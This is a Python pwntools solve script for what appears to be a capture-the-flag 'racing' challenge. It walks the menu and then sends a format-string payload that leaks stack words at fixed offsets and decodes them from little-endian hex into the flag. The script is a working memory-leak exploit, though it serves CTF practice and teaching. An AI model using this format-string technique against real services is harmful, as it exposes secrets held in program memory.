from pwn import *

OFFSET_FLAG_START = 12
OFFSET_FLAG_END   = 23

IP = "0.0.0.0"
PORT = 12345

def exploit():
    with remote(IP, PORT) as chall:
        chall.sendlines([b"", b""])

        # Car Selection
        chall.recvuntil(b"> ")
        chall.sendline(b"2")
        
        # Select Car 1
        chall.recvuntil(b"> ")
        chall.sendline(b"1")

        # Select Race Type 2
        chall.recvuntil(b"> ")
        chall.sendline(b"2")

        # We choose Car 1 and Race 2 since this combination gives us more
        # probability to win the race and then, submit the fmtstr payload

        # Format String Payload
        payload = "".join([f"%{i}$x-" for i in range(OFFSET_FLAG_START, OFFSET_FLAG_END)]).encode()

        chall.recvuntil(b"> ")
        chall.sendline(payload)

        # Get Encoded Flag
        flag = chall.recvlines(3)[2].decode().split("-")

        return flag

def decode_flag(flag: list) -> str:
    decoded_flag = ""

    for byte in flag:
        block_length = len(byte)

        # We start from the last byte since it's Little-Endian
        for i in range(block_length, 0, -2):
            decoded_flag += chr(int(byte[i-2:i], 16))

    return decoded_flag

if __name__ == "__main__":
    # Sometimes it may crash due to the value being generated by rand()
    # The odds are low but it can still happen.
    flag = exploit()
    print(f"{decode_flag(flag)}")
